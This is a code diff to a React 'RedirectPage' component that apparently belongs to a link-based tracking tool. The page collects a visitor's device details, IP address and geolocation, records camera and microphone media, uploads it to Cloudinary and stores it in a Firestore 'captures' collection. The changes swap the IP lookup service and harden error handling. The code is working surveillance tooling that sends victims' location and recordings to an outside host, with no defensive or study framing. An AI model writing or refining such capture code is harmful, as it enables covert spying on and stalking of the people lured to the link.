@@ -376,7 +376,7 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
 
         const { os, browser, deviceType } = parseUserAgent(navigator.userAgent);
         
-        const capturedData: Omit<CapturedData, 'id'> = {
+        const capturedData: Omit<CapturedData, 'id'> & { [key: string]: any } = {
             redirectId,
             name: `Capture @ ${new Date().toLocaleString()}`,
             timestamp: Date.now(),
@@ -396,17 +396,19 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
         };
 
         try {
-            const ipResponse = await fetch('https://ipapi.co/json/');
+            const ipResponse = await fetch('https://ip-api.com/json');
             if (ipResponse.ok) {
                 const ipData = await ipResponse.json();
-                capturedData.ip = ipData.ip;
-                capturedData.location = {
-                    lat: ipData.latitude,
-                    lon: ipData.longitude,
-                    city: ipData.city,
-                    country: ipData.country_name,
-                    source: 'ip',
-                };
+                if (ipData.status === 'success') {
+                    capturedData.ip = ipData.query;
+                    capturedData.location = {
+                        lat: ipData.lat,
+                        lon: ipData.lon,
+                        city: ipData.city,
+                        country: ipData.country,
+                        source: 'ip',
+                    };
+                }
             }
         } catch (e) { console.error("Could not fetch IP data:", e); }
 
@@ -441,17 +443,26 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
                         recorder.start();
                     });
                     
+                    stream.getTracks().forEach(track => track.stop());
+
                     const formData = new FormData();
                     formData.append('file', mediaBlob);
                     formData.append('upload_preset', CLOUDINARY_UPLOAD_PRESET);
                     
                     const res = await fetch(CLOUDINARY_UPLOAD_URL, { method: 'POST', body: formData });
-                    const uploadData = await res.json();
                     
-                    if (permission === 'camera') capturedData.cameraCapture = uploadData.secure_url;
-                    if (permission === 'microphone') capturedData.microphoneCapture = uploadData.secure_url;
-
-                    stream.getTracks().forEach(track => track.stop());
+                    if (res.ok) {
+                        const uploadData = await res.json();
+                        if (uploadData.secure_url) {
+                            if (permission === 'camera') capturedData.cameraCapture = uploadData.secure_url;
+                            if (permission === 'microphone') capturedData.microphoneCapture = uploadData.secure_url;
+                        } else {
+                            console.error("Cloudinary upload succeeded but no secure_url was returned.");
+                        }
+                    } else {
+                         const errorBody = await res.json();
+                         console.error("Cloudinary upload failed:", errorBody);
+                    }
                 }
             } catch {
                 if (permission === 'location') capturedData.permissions.location = 'denied';
@@ -464,6 +475,12 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
         }
         
         try {
+            // Remove undefined properties before saving to Firestore
+            Object.keys(capturedData).forEach(key => {
+                if (capturedData[key] === undefined) {
+                    delete capturedData[key];
+                }
+            });
             await addDoc(collection(db, "captures"), capturedData);
         } catch(e) { console.error("Failed to save captured data:", e); }
         
